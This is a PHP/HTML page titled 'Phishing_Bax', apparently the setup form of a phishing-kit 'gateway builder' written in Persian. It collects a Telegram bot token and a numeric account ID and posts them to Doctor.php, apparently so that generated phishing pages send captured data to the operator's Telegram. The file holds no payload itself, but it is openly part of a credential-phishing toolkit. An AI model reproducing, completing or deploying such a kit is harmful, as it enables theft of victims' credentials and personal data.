<?php

include"info.php";


?>


<!DOCTYPE html>
<html lang="en">
<head>

	<title>Phishing_Bax</title>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width">	
	<link rel="icon" type="image/png" href="images/icons/favicon.png"/>
	<link rel="stylesheet" type="text/css" href="vendor/bootstrap/css/bootstrap.min.css">
	<link rel="stylesheet" type="text/css" href="fonts/font-awesome-4.7.0/css/font-awesome.min.css">
	<link rel="stylesheet" type="text/css" href="vendor/animate/animate.css">	
	<link rel="stylesheet" type="text/css" href="vendor/css-hamburgers/hamburgers.min.css">
	<link rel="stylesheet" type="text/css" href="vendor/select2/select2.min.css">
	<link rel="stylesheet" type="text/css" href="css/util.css">
	<link rel="stylesheet" type="text/css" href="css/main.css">
</head>
<body>
	
	<div class="limiter">
		<div class="container-login100">
			<div class="wrap-login100">
				<div class="login100-pic js-tilt" data-tilt>
					
				</div>

			 <form method="POST" action="Doctor.php">
					<span class="login100-form-title">
						  <?php echo $chanell;?>  درگاه ساز 
					</span>

	<div class="wrap-input100 validate-input" data-validate = "Bot Token is required">
			<input class="input100" type="text"  name="TOKEN" placeholder="توکن ربات">
						<span class="focus-input100"></span>
						<span class="symbol-input100">
							<i class="fa fa-lock" aria-hidden="true"></i>
						</span>
					</div>

<div class="wrap-input100 validate-input" data-validate = "Account Id is required">

			<input class="input100" type="number" name="ID" placeholder="آیدی عددی ">
			
						<span class="focus-input100"></span>
						<span class="symbol-input100">
							<i class="fa fa-key" aria-hidden="true"></i>
						</span>
					</div>
					
					<div class="container-login100-form-btn">
						<button class="login100-form-btn">
							ساخت
						</button>
					</div>

					<div class="text-center p-t-12">
					<span class="txt1"><B>XX Coded By  <?php echo $chanell;?> XX</B></span>
							<div class="text-center p-t-12">
						<a class="txt2" href="https://t.me/ <?php echo $chanell;?>"><b>Need Help ?  Touch It!</b></a>
					</div>

					<div class="text-center p-t-136">
						<a class="txt2" href="">
							<i class="" aria-hidden="true"></i>
						</a>
					</div>
				</form>
			</div>
		</div>
	</div>
	
	


	<script src="vendor/jquery/jquery-3.2.1.min.js"></script>

	<script src="vendor/bootstrap/js/popper.js"></script>
	
	<script src="vendor/bootstrap/js/bootstrap.min.js"></script>

	<script src="vendor/select2/select2.min.js"></script>

	<script src="vendor/tilt/tilt.jquery.min.js"></script>
	
	<script >
		$('.js-tilt').tilt({
			scale: 1.1
		})
	</script>

	<script src="js/main.js"></script>

</body>
</html>


